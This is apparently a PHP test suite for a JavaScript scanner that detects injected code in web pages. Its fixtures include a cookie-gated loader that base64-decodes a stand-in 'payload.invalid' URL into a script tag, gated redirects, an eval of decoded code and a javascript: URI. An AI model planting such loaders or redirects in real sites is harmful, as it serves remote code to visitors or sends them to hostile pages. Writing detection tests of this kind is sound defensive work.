<?php
require __DIR__.'/../lib/js-flow.php';
function test($name, $source, $rule = null, $kind = null) {
    $scanner = new PressWardenJsFlow(); $found = $scanner->scan($source);
    $ids = array_column($found, 'rule');
    if ($rule === null ? count($found) !== 0 : !in_array($rule, $ids, true)) {
        fwrite(STDERR, 'FAIL '.$name.': '.json_encode($found)."\n"); exit(1);
    }
    foreach ($found as $item) if ($item['rule'] === $rule && $kind !== null && $item['kind'] !== $kind) {
        fwrite(STDERR, 'FAIL severity '.$name."\n"); exit(1);
    }
    echo 'PASS '.$name."\n";
}
$url = base64_encode('https://payload.invalid/update.js');
$loader = "if(document.cookie.indexOf('seen')===-1){const u=atob('$url');const s=document.createElement('script');s.src=u;document.head.appendChild(s);}";
$redirect = "if(navigator.userAgent.indexOf('Windows')!==-1){const u=atob('$url');window.location.replace(u);}";
test('gated loader', $loader, 'PW-JS-002', 'REVIEW');
test('gated redirect', $redirect, 'PW-JS-004', 'REVIEW');
test('direct redirect', "if(document.referrer){window.location.href=atob('$url');}", 'PW-JS-004', 'REVIEW');
test('single statement if', "if(document.referrer)window.location.href=atob('$url');", 'PW-JS-004', 'REVIEW');
test('alias and comma declaration', "if(document.referrer){const u=atob('$url'),target=u;window.location.assign(target);}", 'PW-JS-004', 'REVIEW');
test('setAttribute and append', "if(document.cookie){const s=document.createElement('script');s.setAttribute('src',atob('$url'));document.head.append(s);}", 'PW-JS-002', 'REVIEW');
test('cross function collision', "function a(){const e=atob('$url');}function b(){if(document.cookie){window.location.replace(e);}}");
test('cross arrow collision', "(()=>{const e=atob('$url');})();(()=>{if(document.cookie){window.location.replace(e);}})();");
test('cross block collision', "{const e=atob('$url');}{if(document.cookie){window.location.replace(e);}}");
test('later decoder', "if(document.cookie){window.location.replace(u);const u=atob('$url');}");
test('reassignment', "if(document.cookie){let u=atob('$url');u='/account';window.location.href=u;}");
test('unknown reassignment', "if(document.cookie){let u=atob('$url');u=runtime();window.location.href=u;}");
test('conditional reassignment', "let u=atob('$url');if(runtime){u='/account';}if(document.cookie){window.location.href=u;}");
test('wrong script object', "if(document.cookie){const a=document.createElement('script');const b=document.createElement('script');a.src=atob('$url');document.head.appendChild(b);}");
test('source overwritten', "if(document.cookie){const a=document.createElement('script');a.src=atob('$url');a.src='/local.js';document.head.appendChild(a);}");
test('unrelated visitor check', "if(document.cookie){console.log('seen');}const u=atob('$url');window.location.href=u;");
test('comment only', '/* '.$loader.' */');
test('quoted code sample', 'const sample='.json_encode($loader).';');
test('template code sample', 'const sample=`'.$loader.'`;');
test('regex code sample', 'const sample=/'.str_replace('/', '\\/', $loader).'/;');
test('runtime config decoding', 'if(document.cookie){window.location.replace(decodeURIComponent(config.url));}');
test('readable URL normalization', "if(document.cookie){window.location.href=decodeURIComponent('https://example.com/account');}");
test('relative redirect', "if(document.cookie){window.location.href=atob('L2FjY291bnQ=');}");
test('ungated encoded app redirect', "window.location.href=atob('$url');");
test('case sensitive variables', "if(document.cookie){const Target=atob('$url');window.location.href=target;}");
test('property is not global location', "if(document.cookie){router.location.replace(atob('$url'));}");
test('shadowed decoder', "const atob=custom; if(document.cookie){window.location.href=atob('$url');}");
test('shadowed location', "const location=router; if(document.cookie){location.replace(atob('$url'));}");
test('no low byte Unicode truncation', 'if(document.cookie){window.location.href=String.fromCharCode(360,372,372,368,371,314,303,303,353); }');
test('invalid percent URI', "if(document.cookie){window.location.href=decodeURIComponent('%GGhttps://example.com');}");
test('executable URI', "window.location.href=atob('".base64_encode('javascript:alert(1)')."');", 'PW-JS-004', 'ALERT');
test('decoded execution', "eval(atob('".base64_encode("window.location.href='https://payload.invalid';")."'));", 'PW-JS-001', 'ALERT');
test('decoded harmless expression', "eval(atob('Misy'));".str_repeat('/* ordinary application data */', 200));
test('appended injection still visible', str_repeat("function normal(){return 'OK';}", 200).$loader, 'PW-JS-002', 'REVIEW');
test('number byte array', 'if(document.cookie){let u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);location.href=u;}', 'PW-JS-004', 'REVIEW');
test('escaping', 'if(document.cookie){location.href=atob("'.str_replace('a', '\\x61', $url).'");}', 'PW-JS-004', 'REVIEW');

test('shadowed location parameter', "function redirect(location){if(document.cookie){location.replace(atob('$url'));}}");
test('shadowed decoder parameter', "function redirect(atob){if(document.cookie){window.location.replace(atob('$url'));}}");
test('shadowed function declaration', "function atob(x){return x;}if(document.cookie){location.href=atob('$url');}");
test('shadowed object declaration', "const window={};if(document.cookie){window.location.href=atob('$url');}");
test('no gate inherited across callback', "if(document.cookie){function redirect(){location.href=atob('$url');}}");
test('plain normalization is not obfuscation', "if(document.cookie){const s=document.createElement('script');s.src=decodeURIComponent('https://cdn.example.com/file.js');document.head.appendChild(s);}");
test('nested template expressions', 'const x=`text ${fn(`nested ${"x"}`)} more`;');
test('template code stays opaque', 'const x=`${{text: "if(document.cookie){location.href=atob(1)}"}}`;');

// Genuine upstream packages exposed regex literals inside template expressions.
test('template regex quotes', <<<'JS'
const html=`text ${value.replace(/'|"/g, "")}`;
JS
);
test('template regex braces', 'const html=`text ${value.replace(/[{}]/g, "")}`;');
test('template nested regex and callback', 'const html=`${value.replace(/["\\\\]/g, x=>`\\${x}`)}`;');
test('irrelevant runtime bindings stay bounded', implode(";", array_map(function($i){return 'const ordinary'.$i.'=runtime()';},range(0,5000))).';'.$loader, 'PW-JS-002', 'REVIEW');
test('alert cannot be downgraded by later review', "location.href=atob('".base64_encode('javascript:alert(1)')."');".$redirect, 'PW-JS-004', 'ALERT');
test('outer decoder shadowing', "const atob=custom;function run(){if(document.cookie){location.href=atob('$url');}}");
